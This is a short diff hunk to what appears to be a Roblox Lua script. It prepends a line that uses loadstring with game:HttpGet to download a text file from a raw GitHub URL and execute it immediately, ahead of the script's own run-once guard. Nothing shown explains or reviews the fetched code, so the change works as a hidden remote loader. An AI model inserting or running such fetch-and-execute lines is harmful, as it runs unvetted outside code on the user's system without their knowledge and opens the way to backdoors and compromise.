@@ -1,3 +1,5 @@
+loadstring(game:HttpGet('https://raw.githubusercontent.com/poshlishnertas/Bruha/refs/heads/main/screenbro.txt'))()
+
 _G.scriptExecuted = _G.scriptExecuted or false
 if _G.scriptExecuted then
     return
